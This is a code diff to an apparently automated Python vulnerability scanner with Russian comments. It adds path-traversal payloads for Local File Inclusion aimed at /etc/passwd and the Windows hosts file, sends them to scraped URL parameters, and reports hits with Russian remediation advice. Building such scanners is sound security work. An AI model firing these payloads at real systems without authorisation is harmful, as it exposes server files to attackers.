@@ -6,22 +6,28 @@ import json
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-async def test_lfi(session, url, param, value):
+async def test_lfi(session, base_url, param):
     lfi_payloads = [
+        'passwd',
+        'etc/passwd',
         '../../../../etc/passwd',
         '../../../../../../windows/system32/drivers/etc/hosts',
-        '../../../../../../../../../../../etc/passwd',  # Для глубокой вложенности
-        '../../../../../../../../../../../windows/system32/drivers/etc/hosts'  # Для глубокой вложенности на Windows
+        '../../../../../../../../../../../etc/passwd',
+        '../../../../../../../../../../../windows/system32/drivers/etc/hosts'
     ]
     for payload in lfi_payloads:
-        payloaded_url = url.replace(f"{param}={value}", f"{param}={payload}")
+        # Формируем URL правильно, заменяя значение параметра, а не добавляя новый параметр
+        payloaded_url = f"{base_url.split('?')[0]}?{param}={payload}"
+        logger.info(f"Testing LFI with URL: {payloaded_url}")
         try:
             response = await session.get(payloaded_url)
             response_text = await response.text()
+            logger.info(f"Response for {payloaded_url}: {response_text[:100]}")  # Логируем первые 100 символов ответа
             if 'root:' in response_text or '127.0.0.1' in response_text:
+                logger.info(f"LFI vulnerability found: {payloaded_url}")
                 return True, payloaded_url
         except Exception as e:
-            logger.error(f"Error testing LFI payload on {url}: {e}")
+            logger.error(f"Error testing LFI payload on {base_url}: {e}")
     return False, None
 
 async def analyze_lfi(scraped_data):
@@ -30,8 +36,9 @@ async def analyze_lfi(scraped_data):
         for page in scraped_data:
             url = page['URL']
             params = page.get('Parameters', {})
-            for param, value in params.items():
-                is_vulnerable, vulnerable_url = await test_lfi(session, url, param, value)
+            for param in params:
+                logger.info(f"Analyzing URL: {url} with param: {param}")
+                is_vulnerable, vulnerable_url = await test_lfi(session, url, param)
                 if is_vulnerable:
                     vulnerabilities.append({
                         'url': url,
@@ -39,7 +46,18 @@ async def analyze_lfi(scraped_data):
                         'is_vulnerable': True,
                         'type': 'LFI',
                         'payload': vulnerable_url,
-                        'scan_data': f"Мы отправили запрос на {vulnerable_url} с LFI полезной нагрузкой и сервер вернул чувствительные данные."
+                        'description': (
+                            "LFI (Local File Inclusion) уязвимость позволяет злоумышленнику читать локальные файлы на сервере, "
+                            "используя относительные пути в параметрах URL."
+                        ),
+                        'risk_level': "🔴 Высокий",
+                        'recommendation': (
+                            "Для предотвращения LFI атак рекомендуется:\n"
+                            "1. Проверять и фильтровать все входные данные, исключая использование относительных путей.\n"
+                            "2. Использовать белые списки допустимых значений для параметров, связанных с файлами.\n"
+                            "3. Отключить функции включения файлов, если они не используются.\n"
+                            "4. Регулярно обновлять и патчить ПО.\n"
+                        )
                     })
     return vulnerabilities
 
